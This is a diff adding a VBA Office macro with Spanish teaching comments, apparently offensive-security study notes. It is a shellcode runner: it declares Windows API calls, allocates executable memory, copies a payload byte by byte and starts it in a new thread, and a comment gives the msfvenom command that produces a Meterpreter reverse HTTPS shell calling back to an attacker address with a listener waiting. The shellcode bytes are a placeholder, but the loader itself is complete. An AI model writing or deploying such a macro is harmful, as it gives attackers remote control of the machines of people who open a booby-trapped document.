@@ -1,0 +1,33 @@
+Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal ipAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLenght As Long) As LongPtr
+Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
+
+'Ahora creamos el payload que queramos para ver el tamaño.
+'msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication
+'Esto te dará una variable buf= Array(numeros y numeros)
+
+Function MyMacro()
+	Dim buf As Variant
+	Dim addr As LongPtr
+
+	Dim counter As Long
+	Dim data As Long
+
+	buf= Array(numeros y numeros)
+
+	'El 0 significa que deja a la API elegir el sitio de memoria donde alojarlo
+	'El UBound coge el size del payload así no hay que cambiarlo
+	addr= VirtualAlloc(0,UBound(buf), &H3000, &H40)
+
+	'Ahora que ya tenemos la posición donde alojar el payload hay que moverlo byte a byte utilizando la segunda librería mencionada RtlMoveMemory
+	For counter= LBound(buf) To UBound(buf)
+		data= buf(counter)
+		res= RtlMoveMemory(addr + counter, data, 1)
+	Next counter
+	
+
+	'Ya tenemos movidos los bytes al buffer ejecutable entonces utilizamos CreateThread para ejecutar
+	res= CreateThread(0,0,addr,0,0,0)
+	'En este punto ejecuta el shellcode y tendríamos que tener un multi/handler escuchando claro CON LA OPCION set exitfunc thread
+	
+End Function
